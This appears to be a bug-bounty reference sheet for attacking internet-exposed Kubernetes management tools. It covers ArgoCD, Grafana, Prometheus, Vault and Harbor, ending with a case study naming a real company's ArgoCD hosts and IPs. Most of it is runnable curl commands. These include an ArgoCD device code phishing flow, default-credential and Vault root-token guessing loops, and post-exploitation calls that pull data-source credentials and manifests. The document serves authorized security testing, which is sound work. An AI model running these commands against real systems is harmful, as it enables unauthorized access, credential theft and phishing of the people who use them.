# Kubernetes Management Tooling Exposure

Reference for testing exposed Kubernetes management tools (ArgoCD, Grafana, Prometheus, etc.) found during reconnaissance. These tools are commonly internet-exposed by mistake and provide high-impact attack paths.

## Detection During Recon

### Common Subdomain Patterns

```
argocd.domain.com / argocd-ui.domain.com / argo.domain.com
grafana.domain.com / monitoring.domain.com
prometheus.domain.com / prom.domain.com
jaeger.domain.com / tracing.domain.com
kiali.domain.com / mesh.domain.com
rancher.domain.com
lens.domain.com
consul.domain.com / vault.domain.com
harbor.domain.com / registry.domain.com
chartmuseum.domain.com
```

### Fingerprinting via Headers/Responses

| Tool | Indicator | Unauthenticated Endpoint |
|------|-----------|--------------------------|
| ArgoCD | `<title>Argo CD</title>` | `/api/version`, `/api/v1/settings`, `/healthz` |
| Grafana | `<title>Grafana</title>`, `X-Grafana-Org-Id` | `/api/health`, `/login` |
| Prometheus | `<title>Prometheus</title>` | `/api/v1/status/config`, `/-/healthy` |
| Jaeger | `<title>Jaeger UI</title>` | `/api/services` |
| Kiali | `<title>Kiali</title>` | `/api/status`, `/api/namespaces` |
| Rancher | `<title>Rancher</title>` | `/v3/settings` |
| Consul | `Consul` in response | `/v1/agent/self`, `/v1/catalog/services` |
| Vault | `Vault` in response | `/v1/sys/health`, `/v1/sys/seal-status` |
| Harbor | `<title>Harbor</title>` | `/api/v2.0/systeminfo`, `/api/v2.0/projects` |
| ChartMuseum | Helm chart repo | `/api/charts`, `/index.yaml` |

---

## ArgoCD

### Unauthenticated Endpoints (Always Check)

```bash
# Version disclosure
curl -sk "https://$ARGOCD/api/version"

# Settings (may leak auth config, exec status, kustomize options)
curl -sk "https://$ARGOCD/api/v1/settings"

# Health check
curl -sk "https://$ARGOCD/healthz"

# Dex OIDC discovery (if Dex is used for SSO)
curl -sk "https://$ARGOCD/api/dex/.well-known/openid-configuration"

# Dex JWKS (signing keys)
curl -sk "https://$ARGOCD/api/dex/keys"
```

### Key Settings to Look For

| Setting | Risk if Exposed |
|---------|----------------|
| `execEnabled: true` | RCE into pods if auth bypassed |
| `userLoginsDisabled: true` | Only SSO — device code flow is primary attack vector |
| `kustomizeOptions.BuildOptions: "--load-restrictor LoadRestrictionsNone"` | Path traversal in manifests |
| `dexConfig.connectors` | Reveals SSO provider (Google, LDAP, SAML) |
| `url` | Confirms the canonical URL |

### Device Code Flow Attack (Primary Vector)

When ArgoCD uses Dex for SSO and device code flow is enabled:

```bash
# 1. Check if device code flow is available
curl -sk "https://$ARGOCD/api/dex/.well-known/openid-configuration" | \
  jq '.grant_types_supported'
# Look for: "urn:ietf:params:oauth:grant-type:device_code"

# 2. Also check device_authorization_endpoint
curl -sk "https://$ARGOCD/api/dex/.well-known/openid-configuration" | \
  jq '.device_authorization_endpoint'

# 3. Generate device code (no auth required)
curl -sk -X POST "https://$ARGOCD/api/dex/device/code" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=argo-cd&scope=openid+profile+email+groups+offline_access"

# Common client_ids for ArgoCD:
# - argo-cd (default)
# - argo-cd-cli
# - argocd

# 4. The response contains the phishing URL:
# {
#   "device_code": "...",
#   "user_code": "XXXX-YYYY",
#   "verification_uri": "https://argocd.target.com/api/dex/device",
#   "verification_uri_complete": "https://argocd.target.com/api/dex/device?user_code=XXXX-YYYY",
#   "expires_in": 300,
#   "interval": 5
# }

# 5. Poll for token (attacker runs this in a loop)
curl -sk -X POST "https://$ARGOCD/api/dex/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=$DEVICE_CODE&client_id=argo-cd"
# Returns {"error":"authorization_pending"} until victim authorizes
```

### Auth Bypass Attempts

```bash
# Default credentials (if local login enabled)
curl -sk -X POST "https://$ARGOCD/api/v1/session" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'
# Also try: admin/argocd, admin/password, admin/""

# Anonymous access (check if RBAC allows read-only)
curl -sk "https://$ARGOCD/api/v1/applications"
# If 200 → anonymous read access enabled (finding!)

# Empty bearer token
curl -sk "https://$ARGOCD/api/v1/applications" -H "Authorization: Bearer "

# Check if API keys are supported
curl -sk "https://$ARGOCD/api/v1/applications" -H "Authorization: Bearer argocd-token"
```

### Post-Exploitation (With Valid Token)

```bash
TOKEN="eyJ..."

# List all applications (reveals deployed services)
curl -sk -H "Authorization: Bearer $TOKEN" "https://$ARGOCD/api/v1/applications"

# List all clusters (reveals K8s infrastructure)
curl -sk -H "Authorization: Bearer $TOKEN" "https://$ARGOCD/api/v1/clusters"

# List all repositories (reveals Git repos with source code)
curl -sk -H "Authorization: Bearer $TOKEN" "https://$ARGOCD/api/v1/repositories"

# List all projects
curl -sk -H "Authorization: Bearer $TOKEN" "https://$ARGOCD/api/v1/projects"

# Get application details (reveals K8s manifests, secrets references)
curl -sk -H "Authorization: Bearer $TOKEN" "https://$ARGOCD/api/v1/applications/$APP_NAME"

# Get application manifests (may contain secrets)
curl -sk -H "Authorization: Bearer $TOKEN" "https://$ARGOCD/api/v1/applications/$APP_NAME/manifests"

# Exec into pod (if execEnabled: true) — RCE
# WebSocket connection to: /api/v1/applications/$APP/pods/$POD/exec
```

### ArgoCD CVEs to Check

| CVE | Version | Impact |
|-----|---------|--------|
| CVE-2024-31989 | < 2.11.0 | Unprivileged pod reads ArgoCD secrets |
| CVE-2024-28175 | < 2.10.4 | XSS in ArgoCD UI |
| CVE-2024-36106 | < 2.11.3 | Bypass namespace restrictions |
| CVE-2024-40634 | < 2.11.7 | DoS via large manifest |
| CVE-2024-32476 | < 2.10.8 | Bypass project restrictions |
| CVE-2023-50726 | < 2.10.0 | Bypass application-level RBAC |
| CVE-2022-24348 | < 2.3.0 | Path traversal in Helm charts |

---

## Grafana

### Unauthenticated Endpoints

```bash
# Health and version
curl -sk "https://$GRAFANA/api/health"
# {"commit":"...","database":"ok","version":"10.x.x"}

# Login page (check for default creds)
curl -sk "https://$GRAFANA/login"

# Check if anonymous access is enabled
curl -sk "https://$GRAFANA/api/dashboards/home"
# 200 = anonymous access enabled (finding!)

# Check for public snapshots
curl -sk "https://$GRAFANA/api/snapshots"

# Check for public dashboards
curl -sk "https://$GRAFANA/api/search?type=dash-db"
```

### Default Credentials

```
admin:admin (most common)
admin:grafana
admin:password
```

### Post-Exploitation

```bash
# With valid session/API key:
# List all data sources (may contain DB credentials)
curl -sk -H "Authorization: Bearer $TOKEN" "https://$GRAFANA/api/datasources"

# Get data source details (credentials in plaintext!)
curl -sk -H "Authorization: Bearer $TOKEN" "https://$GRAFANA/api/datasources/1"

# List all users
curl -sk -H "Authorization: Bearer $TOKEN" "https://$GRAFANA/api/org/users"

# SSRF via data source proxy
curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://$GRAFANA/api/datasources/proxy/1/api/v1/query?query=up"
```

---

## Prometheus

### Unauthenticated Endpoints (Often No Auth!)

```bash
# Status and config (often exposes scrape targets with internal IPs)
curl -sk "https://$PROM/api/v1/status/config"

# All scrape targets (reveals internal services)
curl -sk "https://$PROM/api/v1/targets"

# Service discovery (internal hostnames/IPs)
curl -sk "https://$PROM/api/v1/targets/metadata"

# All metric names (reveals what's monitored)
curl -sk "https://$PROM/api/v1/label/__name__/values"

# Query for secrets in metrics (sometimes credentials are in labels)
curl -sk "https://$PROM/api/v1/query?query={__name__=~\".*password.*|.*secret.*|.*token.*\"}"

# Alerting rules (reveals thresholds and internal logic)
curl -sk "https://$PROM/api/v1/rules"
```

### High-Value Queries

```bash
# Find all internal services
curl -sk "https://$PROM/api/v1/query?query=up" | jq '.data.result[].metric.instance'

# Find Kubernetes pods
curl -sk "https://$PROM/api/v1/query?query=kube_pod_info"

# Find secrets in environment variables (if exposed via metrics)
curl -sk "https://$PROM/api/v1/query?query=process_start_time_seconds" | \
  jq '.data.result[].metric'
```

---

## Vault (HashiCorp)

### Unauthenticated Endpoints

```bash
# Health and seal status
curl -sk "https://$VAULT/v1/sys/health"
# {"initialized":true,"sealed":false,"standby":false,"performance_standby":false,...}

# Seal status
curl -sk "https://$VAULT/v1/sys/seal-status"

# Check if UI is accessible
curl -sk "https://$VAULT/ui/"
```

### Auth Bypass Attempts

```bash
# Try default root token
curl -sk -H "X-Vault-Token: root" "https://$VAULT/v1/sys/mounts"
curl -sk -H "X-Vault-Token: vault-root" "https://$VAULT/v1/sys/mounts"

# Try common tokens
for token in root s.root vault myroot admin; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" -H "X-Vault-Token: $token" "https://$VAULT/v1/sys/mounts")
  [ "$code" != "403" ] && echo "VALID TOKEN: $token -> $code"
done
```

---

## Harbor (Container Registry)

### Unauthenticated Endpoints

```bash
# System info (version, auth mode)
curl -sk "https://$HARBOR/api/v2.0/systeminfo"

# List public projects
curl -sk "https://$HARBOR/api/v2.0/projects?public=true"

# List repositories in public projects
curl -sk "https://$HARBOR/api/v2.0/projects/$PROJECT/repositories"

# Search for images
curl -sk "https://$HARBOR/api/v2.0/search?q=secret"
```

### Default Credentials

```
admin:Harbor12345 (default)
admin:admin
```

---

## Severity Guidance

| Scenario | Severity | Rationale |
|----------|----------|-----------|
| ArgoCD accessible + device code flow + execEnabled | Critical | Full cluster RCE via phishing |
| ArgoCD accessible + anonymous read | High | Reveals all deployments, repos, clusters |
| ArgoCD accessible + settings/version only | Medium | Info disclosure + attack planning |
| Grafana with anonymous dashboard access | Medium-High | May reveal internal metrics, architecture |
| Grafana with default creds | Critical | Data source credentials in plaintext |
| Prometheus fully unauthenticated | High | Internal service discovery, architecture |
| Vault unsealed + accessible | Critical | Potential secret exfiltration |
| Harbor with public projects | Medium | Container image access, potential secrets in layers |
| ChartMuseum accessible | Low-Medium | Helm chart access, potential secrets in values |

## Real-World Case Study: GoPay ArgoCD (May 2026)

**Target:** `*.go-pay.co.id` (GoTo Financial, YesWeHack, Medium value $50-$1,000)

**Discovery path:**
1. `subfinder -d go-pay.co.id` → found `argocd-ui.go-pay.co.id` + `argocd-ui-stg.go-pay.co.id`
2. Both resolved to public IPs (149.129.250.140 prod, 149.129.243.113 stg)
3. Both returned 200 with `<title>Argo CD</title>`

**Findings:**
- Production: v2.14.13, `execEnabled: true`, Google SSO via Dex, device code flow working
- Staging: v3.0.2 (newer than prod!), same config pattern
- `/api/v1/settings` unauthenticated on both — full resource override config exposed
- Managed resources: Elasticsearch, Kafka (Strimzi), Velero, cert-manager, ClusterRoleBindings, CRDs, Argo Rollouts
- Kustomize `--load-restrictor LoadRestrictionsNone` on both
- 5 RSA signing keys in JWKS

**Scope interpretation (important for bug bounty):**
- Program excludes "staging environments (test/integration/staging in domain)"
- `argocd-ui-stg.go-pay.co.id` → likely excluded (has "stg" in name)
- `argocd-ui.go-pay.co.id` → clearly in-scope (production management plane under `*.go-pay.co.id` wildcard)
- Report focused on the PRODUCTION instance; staging mentioned as additional evidence

**Severity:** High (CVSS 7.3) — unauthenticated config disclosure + device code flow + execEnabled. Not Critical because device code requires social engineering (user interaction).

**Key lesson:** When a program excludes "staging environments," management tooling (ArgoCD, Grafana, etc.) on production subdomains is still in-scope even if a staging variant also exists. Always check BOTH and report the production one.

**Infrastructure pattern:** GoTo/GoPay uses paired ArgoCD instances (`argocd-ui.domain` for prod, `argocd-ui-stg.domain` for staging) on separate IPs. The staging instance often runs a NEWER version (canary deployment pattern for infra tooling).

---

## Reporting Notes

- Frame as "exposed internal service" not "social engineering" (for device code findings)
- The vulnerability is the EXPOSURE — the service should not be internet-accessible
- Device code flow is the IMPACT AMPLIFIER showing what an attacker can achieve
- Always document what's accessible WITHOUT auth (settings, version, JWKS) as standalone info disclosure
- If the program excludes "open ports without exploitable PoC" — the device code flow IS the PoC
- When both prod and staging exist, report the PRODUCTION instance as primary finding; mention staging as evidence of systemic issue
